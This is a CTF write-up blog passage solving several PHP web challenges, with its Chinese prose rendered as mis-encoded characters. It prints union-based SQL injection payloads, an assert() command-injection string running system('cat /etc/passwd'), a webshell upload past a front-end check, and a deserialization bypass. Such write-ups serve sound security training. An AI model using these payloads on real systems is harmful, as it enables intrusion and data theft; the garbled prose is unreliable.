class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$_o</span>=strrev(<span class="variable">$str</span>); <span class="comment">// å°†$stråè½¬ï¼ˆé€†åºï¼‰</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$_0</span>=<span class="number">0</span>;<span class="variable">$_0</span>&lt;strlen(<span class="variable">$_o</span>);<span class="variable">$_0</span>++)&#123;  <span class="comment">// éå†</span></span><br><span class="line">        <span class="variable">$_c</span>=substr(<span class="variable">$_o</span>,<span class="variable">$_0</span>,<span class="number">1</span>); <span class="comment">// $_c ç­‰åŒäº $_o[$_0]</span></span><br><span class="line">        <span class="variable">$__</span>=ord(<span class="variable">$_c</span>)+<span class="number">1</span>;  <span class="comment">// $__ ç­‰äº $_cçš„asciiå€¼åŠ 1</span></span><br><span class="line">        <span class="variable">$_c</span>=chr(<span class="variable">$__</span>);  <span class="comment">// å†å°† $__ è½¬ä¸ºasciiå­—ç¬¦</span></span><br><span class="line">        <span class="variable">$_</span>=<span class="variable">$_</span>.<span class="variable">$_c</span>;   <span class="comment">// å­—ç¬¦ä¸²æ‹¼æ¥</span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> str_rot13(strrev(base64_encode(<span class="variable">$_</span>)));</span><br><span class="line">    <span class="comment">// å…ˆbase64ç¼–ç ã€å†é€†åºï¼Œå†è¿›è¡ŒROT13 ç¼–ç ï¼ˆæ‰€æœ‰å­—æ¯æŒ‰ç…§å­—æ¯è¡¨å‘å‰ç§»åŠ¨13ä½ï¼‰</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></code></pre><p>æœ‰å‡ ä¸ªå‡½æ•°æ‹¿å‡ºæ¥è®°å½•ä¸€ä¸‹ï¼š</p><ul><li>strrev(str)ï¼šå¯¹å­—ç¬¦ä¸²æ‰§è¡Œé€†åºæ“ä½œï¼Œå¦‚str=abcdï¼Œæ‰§è¡Œåä¸ºdcba</li><li>substr(str, a, n)ï¼šåœ¨å­—ç¬¦ä¸²strä¸­ï¼Œä»ä¸‹æ ‡ä¸ºaå¼€å§‹æˆªå–ï¼Œå…±æˆªå–nä¸ªå­—ç¬¦ï¼ˆä¸æŒ‡å®šnåˆ™æˆªå–åˆ°æœ«å°¾ï¼‰ã€‚é¢˜ç›®ä¸­nä¸º1ï¼Œaåˆæ˜¯ä¸æ–­é€’å¢ï¼Œæ‰€ä»¥å’Œå•Ša[i]è¿™ç§æ²¡æœ‰åŒºåˆ«</li><li>ord(s)ï¼šè¿”å›å­—ç¬¦sçš„asciiç </li><li>chr(n)ï¼šè¿”å›æ•°å­—nå¯¹åº”çš„assciiå­—ç¬¦</li><li>str_rot13(str)ï¼šå­—ç¬¦ä¸²strä¸­æ‰€æœ‰å­—æ¯æŒ‰ç…§å­—æ¯è¡¨å‘å‰ç§»åŠ¨13ä½ï¼ˆè¿˜åŸå°±æ˜¯å†æ‰§è¡Œä¸€æ¬¡è¯¥å‡½æ•°ï¼‰</li></ul><p>çŸ¥é“äº†åŠ å¯†æµç¨‹ï¼Œè§£å¯†å°±ä»åå¾€å‰ä¾æ¬¡åå‘æ“ä½œå°±OKäº†ï¼Œç›´æ¥ç”¨phpå†™å§ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><pre><code><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$_o</span> = base64_decode(strrev(str_rot13(<span class="variable">$str</span>)));</span><br><span class="line">    <span class="variable">$_</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$_0</span> = <span class="number">0</span>; <span class="variable">$_0</span> &lt; strlen(<span class="variable">$_o</span>); <span class="variable">$_0</span>++)&#123;</span><br><span class="line">        <span class="variable">$_c</span> = substr(<span class="variable">$_o</span>, <span class="variable">$_0</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$__</span> = ord(<span class="variable">$_c</span>) - <span class="number">1</span>;  <span class="comment">// è§£å¯†å‡1</span></span><br><span class="line">        <span class="variable">$_c</span> = chr(<span class="variable">$__</span>);</span><br><span class="line">        <span class="variable">$_</span> = <span class="variable">$_</span> . <span class="variable">$_c</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> strrev(<span class="variable">$_</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></code></pre><p>ä¼ å…¥å¯†æ–‡ï¼Œæ‰§è¡Œå³å¯å¾—åˆ°flag<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/12/1602477623.png" alt="1602774229504.png"></p><h2 id="â­-PHP2ï¼ˆphpsæºç æ³„æ¼-URLencodeç»•è¿‡ï¼‰"><a href="#â­-PHP2ï¼ˆphpsæºç æ³„æ¼-URLencodeç»•è¿‡ï¼‰" class="headerlink" title="â­ PHP2ï¼ˆphpsæºç æ³„æ¼+URLencodeç»•è¿‡ï¼‰"></a>â­ PHP2ï¼ˆphpsæºç æ³„æ¼+URLencodeç»•è¿‡ï¼‰</h2><p>é¢˜ç›®é¦–é¡µï¼š</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604331731.png" alt="1602926244643.png"></p><p>å°è¯•ç›´æ¥åœ¨urlåè¾¹åŠ id=1â€¦â€¦æ¥çŒœæµ‹ï¼Œä½†æ˜¯æ— æœã€‚ç»å¸ˆå‚…ä»¬çš„åšæ–‡æç¤ºï¼Œå¾—çŸ¥å¯»åœ¨index.phpæ–‡ä»¶ï¼Œä½†æ˜¯è®¿é—®è¯¥æ–‡ä»¶æ²¡æœ‰ååº”ã€‚</p><p>OKï¼Œå°è¯•è®¿é—®index.phpsï¼ˆ.phpsåç¼€ä¸ºphpæ–‡ä»¶çš„æºç æ–‡ä»¶ï¼Œç”¨äºåœ¨ç½‘é¡µæŸ¥çœ‹phpæºç ï¼Œå› ä¸ºphpä¼šè¢«è§£ææ‰§è¡Œï¼‰ï¼Œå¾—åˆ°é¡µé¢æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;admin&quot;</span>===<span class="variable">$_GET</span>[id]) &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[id] = urldecode(<span class="variable">$_GET</span>[id]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[id] == <span class="string">&quot;admin&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>è¿›è¡Œç®€å•çš„å®¡è®¡</strong></p><p>GETæ–¹å¼ä¼ å…¥idå‚æ•°ï¼Œå¯¹idæœ‰ä¸¤ä¸ªifåˆ¤æ–­è¯­å¥ï¼š</p><ul><li>ç¬¬ä¸€ä¸ªï¼šå¼ºç­‰äºåˆ¤æ–­idæ˜¯å¦ä¸ºadminï¼Œè‹¥æ˜¯åˆ™ç»ˆæ­¢ç¨‹åº</li><li>ç¬¬äºŒä¸ªï¼šå¼±ç­‰äºåˆ¤æ–­idæ˜¯å¦ä¸ºadminï¼Œè‹¥æ˜¯åˆ™è¾“å‡ºflag</li></ul><p>å…¶ä¸­ï¼Œç¬¬ä¸€ä¸ªå’Œç¬¬äºŒä¸ªifåˆ¤æ–­ä¹‹é—´è¿›è¡Œäº†ä¸€æ¬¡ä¸»åŠ¨urlè§£ç æ“ä½œã€‚</p><p>èµ·åˆä»¥ä¸ºæ˜¯phpå¼±ç±»å‹ç›¸å…³é¢˜ç›®ï¼Œæ‰€ä»¥ä¼ å…¥äº†id=0ï¼Œä½†æ˜¯ä¸æ­£ç¡®ï¼Œäºæ˜¯é‡‡ç”¨å¦ä¸€ç§ã€‚</p><p>æ ¹æ®æºç ï¼Œéœ€è¦åœ¨ä¼ å…¥idæ—¶ç»•è¿‡ç¬¬ä¸€æ¬¡çš„ç­‰äºadminåˆ¤æ–­ï¼Œå³ç¬¬ä¸€æ¬¡adminåˆ¤æ–­ä¸ºfalseï¼Œç„¶åç»è¿‡urldecodeåï¼Œå†æ¬¡åˆ¤æ–­adminä¸ºtrueã€‚ä½†æ˜¯ç”±äºæµè§ˆå™¨æœ‰ä¸€æ¬¡urlè‡ªè§£ç æ“ä½œï¼Œæ‰€ä»¥éœ€è¦è¿›è¡Œä¸¤æ¬¡urlç¼–ç ã€‚</p><p>ä½¿ç”¨Burpå¯¹adminåšurläºŒæ¬¡ç¼–ç ï¼š</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604331747.png" alt="1602927131742.png"></p><p>ä¼ å…¥idï¼Œå¾—åˆ°flagï¼š</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604331756.png" alt="1602927173038.png"></p><h2 id="â­-NewsCenterï¼ˆå¸¸è§„SQLæ³¨å…¥ï¼‰"><a href="#â­-NewsCenterï¼ˆå¸¸è§„SQLæ³¨å…¥ï¼‰" class="headerlink" title="â­ NewsCenterï¼ˆå¸¸è§„SQLæ³¨å…¥ï¼‰"></a>â­ NewsCenterï¼ˆå¸¸è§„SQLæ³¨å…¥ï¼‰</h2><p>ä¸€é“SQLæ³¨å…¥é¢˜ç›®ï¼Œå¾ˆåŸºç¡€çš„POSTå­—ç¬¦å‹æ³¨å…¥ï¼Œé¦–å…ˆfuzzä»¥ä¸‹å¾—åˆ°å¯è§£æç¬¦å·ï¼Œæœ€ç»ˆå¾—åˆ°ä½¿ç”¨ä»¥ä¸‹payloadå¯æˆåŠŸè§£æï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; or 1&#x3D;1 #</span><br></pre></td></tr></table></figure><p>æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œå› æ­¤æŒ‰ç…§å¸¸è§„æ‰‹å·¥æ³¨å…¥æ­¥éª¤ä¾æ¬¡æ‰§è¡Œï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-1&#39; order by 3 #</span><br><span class="line">-1&#39; union select 1,2,3 #</span><br><span class="line">-1&#39; union select 1,2,table_name from information_schema.tables where table_schema&#x3D;&quot;news&quot; #</span><br><span class="line">-1&#39; union select 1,2,column_name from information_schema.columns where table_name&#x3D;&quot;secret_table&quot; #</span><br><span class="line">-1&#39; union select 1,2,fl4g from secret_table #</span><br></pre></td></tr></table></figure><p>å¾—åˆ°flag</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604331798.png" alt="1602939552256.png"></p><p>ä¹Ÿå¯ä»¥sqlmapè¿›è¡Œå·¥å…·æ³¨å…¥ã€‚</p><h2 id="â­-mfwï¼ˆ-gitæºç æ³„éœ²-assert-å‘½ä»¤æ‰§è¡Œï¼‰"><a href="#â­-mfwï¼ˆ-gitæºç æ³„éœ²-assert-å‘½ä»¤æ‰§è¡Œï¼‰" class="headerlink" title="â­ mfwï¼ˆ.gitæºç æ³„éœ²+assert()å‘½ä»¤æ‰§è¡Œï¼‰"></a>â­ mfwï¼ˆ.gitæºç æ³„éœ²+assert()å‘½ä»¤æ‰§è¡Œï¼‰</h2><p>ç½‘ç«™ä½¿ç”¨pageå‚æ•°è¿›è¡Œæ–‡ä»¶åŒ…å«ï¼Œå°è¯•ç›´æ¥åŒ…å«passwdæ–‡ä»¶ç»“æœæœ‰è¿‡æ»¤ï¼ŒAbouté¡µé¢æœ‰æç¤ºç”¨äº†Gitã€phpå’Œbootstrap</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604331832.png" alt="1604045680816.png"></p><p>ä½¿ç”¨Gitå°±åº”è¯¥æƒ³åˆ°**.gitæºç æ³„æ¼**ï¼ŒDirbè·‘ä¸€ä¸‹æœç„¶å­˜åœ¨.gitç›®å½•ï¼Œä½¿ç”¨å·¥å…·GitHackæ¢å¤gitå†å²æ–‡ä»¶ï¼Œæ¢å¤çš„åŸç†æ˜¯ï¼š</p><p>è§£æ <code>.git/index</code> æ–‡ä»¶ï¼Œå¹¶æ‰¾åˆ°å·¥ç¨‹ä¸­æ‰€æœ‰çš„æ–‡ä»¶åå’Œæ–‡ä»¶ sha1ï¼Œç„¶åå» <code>.git/objects/</code> æ–‡ä»¶å¤¹ä¸‹ä¸‹è½½å¯¹åº”çš„æ–‡ä»¶ï¼Œé€šè¿‡ zlib è§£å‹æ–‡ä»¶ï¼ŒæŒ‰åŸå§‹çš„ç›®å½•ç»“æ„å†™å…¥æºä»£ç ã€‚å…·ä½“å¯å‚è€ƒä¸‹é¢çš„æ–‡ç« ï¼š</p><ul><li>gitæºç æ³„éœ²æ€»ç»“ï¼š<a href="https://blog.csdn.net/qq_36869808/article/details/88909961"><strong>https://blog.csdn.net/qq_36869808/article/details/88909961</strong></a></li></ul><p>ä½¿ç”¨GitHackæ¢å¤å‡ºä»¥ä¸‹æ–‡ä»¶ï¼Œä½†æ˜¯flagæ²¡æœ‰ç›´æ¥ç»™å‡ºï¼Œè€ƒè™‘å…¶ä»–åŠæ³•</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604331970.png" alt="1604048674270ï¼ˆ1ï¼‰.png"></p><p>åœ¨index.phpä¸­å‘ç°äº†è¿‡æ»¤ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$page</span> = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;templates/&quot;</span> . <span class="variable">$page</span> . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line"><span class="comment">// I heard &#x27;..&#x27; is dangerous!</span></span><br><span class="line">assert(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line">assert(<span class="string">&quot;file_exists(&#x27;<span class="subst">$file</span>&#x27;)&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;That file doesn&#x27;t exist!&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç¬¬9è¡Œä½¿ç”¨äº†**assert()**æ–­è¨€å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°æ˜¯å¯ä»¥ç”¨æ¥è¿›è¡Œä»£ç æ‰§è¡Œçš„ï¼Œè€Œä¸”è¿‡æ»¤ä¹Ÿå¾ˆç®€å•ï¼Œå°±æ˜¯ç”¨<code>strpos (&#39;$file&#39;, &#39;..&#39;)</code>åˆ¤æ–­æ˜¯å¦å­˜åœ¨<code>..</code>ï¼Œæ—¢ç„¶çŸ¥é“äº†è¿‡æ»¤æ–¹æ³•ï¼Œä¹Ÿæ²¡æœ‰å¯¹pageå‚æ•°åšå®‰å…¨æ ¡éªŒï¼Œæ‰€ä»¥å¯ä»¥æ¥å‘½ä»¤æ‰§è¡Œ</p><p>é¦–å…ˆéœ€è¦é—­åˆstrposçš„å‰åŠéƒ¨åˆ†ï¼Œç„¶ååŠ å…¥system()ä»£ç ï¼Œå†é—­åˆååŠéƒ¨åˆ†ï¼Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaa<span class="string">&#x27;, &#x27;</span><span class="number">123</span><span class="string">&#x27;) === false and system(&#x27;</span>cat /etc/passwd<span class="string">&#x27;) and strpos(&#x27;</span>aaa</span><br></pre></td></tr></table></figure><p>urlç¼–ç åä¼ å‚ï¼ŒæˆåŠŸæ‰§è¡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaa%<span class="number">27</span>%<span class="number">2</span>c+%<span class="number">27123</span>%<span class="number">27</span>)+%<span class="number">3</span>d%<span class="number">3</span>d%<span class="number">3</span>d+<span class="literal">false</span>+<span class="keyword">and</span>+system(%<span class="number">27</span>cat+%<span class="number">2</span>fetc%<span class="number">2</span>fpasswd%<span class="number">27</span>)+<span class="keyword">and</span>+strpos(%<span class="number">27</span>aaa</span><br></pre></td></tr></table></figure><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604331986.png" alt="1604049280880 (1).png"></p><p>ä¿®æ”¹æ–‡ä»¶ä¸º./templates/flag.phpæ–‡ä»¶ï¼Œå³å¯å¾—åˆ°flag</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604332006.png" alt="1604049453092 (1).png"></p><p>ç»è¿‡å¤§ä½¬çš„æŒ‡ç‚¹ï¼Œç†è§£äº†ä¸ºä»€ä¹ˆgitæºç ä¸­çœ‹ä¸åˆ°flagï¼Œè€Œcatå°±å¯ä»¥ï¼Œå› ä¸ºcatçš„æ–‡ä»¶å’Œ.gitä¸­å­˜æ”¾çš„ä¸æ˜¯åŒä¸€ä¸ªæ–‡ä»¶ã€‚</p><h2 id="â­-upload1ï¼ˆå‰ç«¯JSæ ¡éªŒç»•è¿‡ï¼‰"><a href="#â­-upload1ï¼ˆå‰ç«¯JSæ ¡éªŒç»•è¿‡ï¼‰" class="headerlink" title="â­ upload1ï¼ˆå‰ç«¯JSæ ¡éªŒç»•è¿‡ï¼‰"></a>â­ upload1ï¼ˆå‰ç«¯JSæ ¡éªŒç»•è¿‡ï¼‰</h2><p>æ‰“å¼€é¢˜ç›®ï¼Œä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„åŠŸèƒ½ï¼Œå°è¯•ä¸Šä¼ shell.phpï¼Œæç¤ºåªå…è®¸jpgæˆ–pngï¼ŒF12åœ¨ç½‘ç»œä¸­æ²¡å‘ç°jsæ–‡ä»¶ï¼ŒæŸ¥çœ‹æºå—å‘ç°å‰ç«¯è¿‡æ»¤çš„jsæ–‡ä»¶ï¼š</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604332095.png" alt="1602930407128(1).png"></p><p>ä½¿ç”¨NoScriptæ— æ•ˆåï¼Œç´¢æ€§æŠ“åŒ…å¹¶ä¸»åŠ¨å“åº”è¯¥è¯·æ±‚ï¼Œä¿®æ”¹å“åº”åŒ…çš„jsæºç ï¼Œç›´æ¥å°†æ ¡éªŒå‡½æ•°return trueï¼š</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604332108.png" alt="1602930629651.png"></p><p>å†æ¬¡ä¸Šä¼ shell.phpï¼Œå³å¯æˆåŠŸä¸Šä¼ </p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604332116.png" alt="1602930706543.png"></p><p>èšå‰‘è¿æ¥ï¼Œåœ¨webæ ¹ç›®å½•å‘ç°flag.phpï¼Œå¾—åˆ°flag</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604332124.png" alt="1602930765924.png"></p><p>å½“ç„¶è¿˜å¯ä»¥é€šè¿‡ä¿®æ”¹åç¼€çš„æ–¹å¼æ¥ç»•è¿‡å‰ç«¯æ ¡éªŒã€‚</p><h2 id="â­-ics-04ï¼ˆSQLæ³¨å…¥-æ³¨å†Œè¦†ç›–ï¼‰"><a href="#â­-ics-04ï¼ˆSQLæ³¨å…¥-æ³¨å†Œè¦†ç›–ï¼‰" class="headerlink" title="â­ ics-04ï¼ˆSQLæ³¨å…¥+æ³¨å†Œè¦†ç›–ï¼‰"></a>â­ ics-04ï¼ˆSQLæ³¨å…¥+æ³¨å†Œè¦†ç›–ï¼‰</h2><p>é¢˜ç›®æè¿°ï¼Œåœ¨ç³»ç»Ÿåœ°ç™»å½•å’Œæ³¨å†Œå¤„å­˜åœ¨å®‰å…¨æ¼æ´ï¼Œç«‹é©¬æƒ³åˆ°å¯èƒ½æ˜¯SQLæ³¨å…¥ã€‚</p><p>ç³»ç»Ÿæœ‰æ³¨å†Œã€ç™»å½•å’Œæ‰¾å›å¯†ç ä¸‰å¤„åŠŸèƒ½ï¼Œæ³¨å†Œäº†å‡ ä¸ªè´¦æˆ·ï¼Œç™»é™†åä½“æœ¯æ™®é€šç”¨æˆ·ç™»é™†æ— æ•ˆï¼Œçœ‹æ¥éœ€è¦ç®¡ç†å‘˜è´¦æˆ·æˆ–æƒé™</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604332371.png" alt="1604221348795.png"></p><p>å°è¯•åœ¨æ³¨å†Œå¤„æŠ“åŒ…ï¼Œé€šè¿‡user levelä¿®æ”¹æƒé™è¿›è¡Œè¶Šæƒï¼Œä½†æ˜¯æ²¡æœ‰å‘ç°ç›¸å…³å‚æ•°ã€‚</p><p>æ¥ç€åœ¨æ‰¾å›å¯†ç å¤„å‘ç°äº†SQLæ³¨å…¥ï¼Œç›´æ¥ä¸¢SQLmapè·‘å‡ºäº†userè¡¨çš„å†…å®¹ï¼Œå¾—åˆ°ä¸€ä¸ªé»˜è®¤è´¦æˆ·ï¼ŒçŒœæµ‹æ˜¯ç®¡ç†å‘˜è´¦æˆ·</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604332386.png" alt="1604221498269(1).png"></p><p>å¯†ç MD5ç›´æ¥è·‘å‡ºæ¥äº†ğŸ˜‚åº”è¯¥æ˜¯åšäº†è¿™ä¸ªé¢˜åæ·»åŠ äº†è¿™æ¡è®°å½•å§</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604332417.png" alt="1604221772450.png"></p><p>ç™»å½•è¯¥è´¦æˆ·ï¼Œå³å¯å¾—åˆ°flagã€‚</p><p>ä½†æ˜¯è¿™é“é¢˜åº”è¯¥ä¸æ˜¯ä»…ä»…åˆ©ç”¨ä¸€ä¸ªSQLæ³¨å…¥çš„ï¼ŒåŸæ„æ˜¯å¯†ç æ— æ³•è§£å¼€å§ï¼Œæ‰€ä»¥åœ¨SQLæ³¨å…¥å¾—åˆ°ç®¡ç†å‘˜ç”¨æˆ·ååï¼Œéœ€è¦åˆ©ç”¨é‡å¤æ³¨å†Œæ¼æ´æ¥è¦†ç›–ç®¡ç†å‘˜å¯†ç </p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604332426.png" alt="1604222001521.png"></p><p>ç”¨è®¾å®šçš„æ–°å¯†ç ç™»å½•ï¼Œå³å¯å¾—åˆ°flag</p><h2 id="â­-unserialize3ï¼ˆphpååºåˆ—åŒ–-wakeup-ç»•è¿‡ï¼‰"><a href="#â­-unserialize3ï¼ˆphpååºåˆ—åŒ–-wakeup-ç»•è¿‡ï¼‰" class="headerlink" title="â­ unserialize3ï¼ˆphpååºåˆ—åŒ–__wakeup()ç»•è¿‡ï¼‰"></a>â­ unserialize3ï¼ˆphpååºåˆ—åŒ–__wakeup()ç»•è¿‡ï¼‰</h2><p>é¢˜ç›®æ˜¯ä¸€æ®µphpä»£ç ï¼Œæ˜¯ååºåˆ—åŒ–é¢˜ç›®ï¼Œéœ€è¦å°†åºåˆ—åŒ–ç»“æœé€šè¿‡codeä¼ é€’ã€‚</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/14/1605324557.png" alt="1602406299342.png"></p><p>æºç ä¿å­˜åˆ°æœ¬åœ°ï¼Œæ·»åŠ åºåˆ—åŒ–ä»£ç è¿›è¡Œå®¡è®¡å’Œè¾“å‡ºæµ‹è¯•ï¼Œéœ€è¦è¡¥å…¨å¤§æ‹¬å·</p><pre><code><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;111&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> xctf;</span><br><span class="line"><span class="keyword">echo</span>(serialize(<span class="variable">$s</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></code></pre><p>é¦–å…ˆå‘ç°ï¼Œä»£ç ä¸­å­˜åœ¨__wakeup()é­”æœ¯æ–¹æ³•ï¼Œè¯¥é­”æœ¯æ–¹æ³•åœ¨ååºåˆ—åŒ–æ“ä½œæ‰§è¡Œå‰è°ƒç”¨ï¼Œç”¨äºåˆå§‹åŒ–æ“ä½œï¼Œå¦‚è·å–å¿…è¦èµ„æºç­‰ã€‚</p><p>ä½†æ˜¯æœ¬é¢˜ä¸­<code>__wakeup()</code>å†…å®¹æ˜¯ç»“æŸç¨‹åºï¼Œå› æ­¤å¾ˆæ˜æ˜¾æœ¬é¢˜æ˜¯è¦åˆ©ç”¨__wakeup()é­”æœ¯æ–¹æ³•çš„å¤±æ•ˆæ¼æ´ï¼Œå³<strong>åœ¨ååºåˆ—åŒ–æ—¶ï¼Œå½“å¯¹è±¡å±æ€§ä¸ªæ•°å¤§äºçœŸå®ä¸ªæ•°ï¼Œå°±ä¼šç»•è¿‡è¯¥é­”æœ¯æ–¹æ³•ç›´æ¥æ‰§è¡Œååºåˆ—åŒ–æ“ä½œã€‚</strong></p><p>æ‰§è¡Œè¯¥ä»£ç ï¼Œå¾—åˆ°ä»¥ä¸‹åºåˆ—åŒ–ç»“æœï¼š</p><pre><code>O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></pre><p>å°†å±æ€§æ•°é‡æ”¹ä¸ºå¤§äºå½“å‰æ•°é‡çš„å€¼ï¼Œæ¯”å¦‚2ï¼Œç„¶åå‘åŒ…ï¼Œå³å¯å¾—åˆ°flag</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/14/1605324566.png" alt="1602405430595.png"></p><h2 id="â­-warmupï¼ˆæ–‡ä»¶åŒ…å«ï¼‰"><a href="#â­-warmupï¼ˆæ–‡ä»¶åŒ…å«ï¼‰" class="headerlink" title="â­ warmupï¼ˆæ–‡ä»¶åŒ…å«ï¼‰"></a>â­ warmupï¼ˆæ–‡ä»¶åŒ…å«ï¼‰</h2><p><a href="https://www.yyxzz.net/articles/169.html"><strong>https://www.yyxzz.net/articles/169.html</strong></a></p><p>é¢˜ç›®å‡ºè‡ª2018 